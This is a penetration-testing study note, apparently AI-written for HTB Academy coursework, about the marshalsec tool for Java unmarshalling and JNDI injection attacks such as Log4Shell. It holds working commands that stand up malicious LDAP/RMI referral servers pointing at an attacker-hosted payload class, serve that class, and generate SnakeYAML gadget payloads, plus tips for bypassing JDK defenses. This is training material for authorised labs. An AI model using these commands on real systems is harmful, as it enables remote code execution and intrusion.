# marshalsec

**Tags:** #marshalsec #Deserialization #Java #JNDI #LDAP #RMI #RCE #Log4Shell #Payloads

`marshalsec` targets Java **unmarshalling** libraries rather than native serialization — Jackson, XStream, SnakeYAML, Kryo, Hessian, Castor, and friends — where a permissive type handler lets attacker-supplied JSON/XML/YAML instantiate arbitrary classes. Its second, more commonly used role is as a **malicious JNDI referral server** (LDAP/RMI): the piece that turns a JNDI lookup sink (Log4Shell and similar) into remote class loading.

**Source:** https://github.com/mbechler/marshalsec
**Install:** `git clone https://github.com/mbechler/marshalsec && cd marshalsec && mvn clean package -DskipTests`

```bash
# Stand up a malicious LDAP referral server pointing at your class-hosting HTTP server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://10.10.14.5:8000/#Exploit"

# RMI variant
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.RMIRefServer "http://10.10.14.5:8000/#Exploit"

# Serve the compiled payload class from the same host/port referenced above
javac Exploit.java && python3 -m http.server 8000
```

```bash
# Unmarshalling payload generation (the other half of the tool)
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson    # list Jackson gadgets
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.SnakeYAML  # SnakeYAML gadgets
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream

# Generate a specific gadget payload
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.SnakeYAML SpringPropertyPathFactory http://10.10.14.5:8000/ Exploit
```

> [!warning] Modern JDKs block remote class loading over JNDI by default (`com.sun.jndi.ldap.object.trustURLCodebase=false` since 8u191/11.0.1). Against a patched JVM the referral-server path fails and you need a **local** gadget on the target's classpath (e.g. Tomcat's `BeanFactory`) instead of a remote class.

> [!note] The `Exploit.java` class you serve needs its payload in a **static initializer block**, not `main()` — the JVM runs the static block on class load, which is the only code that executes during the referral.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Deserialization|Deserialization]] — Java unmarshalling gadgets and JNDI referral servers. Native-serialization chains are [[Tools/Payloads & Shells/ysoserial|ysoserial]].
> Also used in [[Class notes/HTB Academy/CPTS v2 (claude)/Non-PHP Web App Attacks|Non-PHP Web App Attacks]] (CPTS v2).

---

*Created: 2026-07-30*
*Updated: 2026-07-31*
*Model: claude-opus-5*
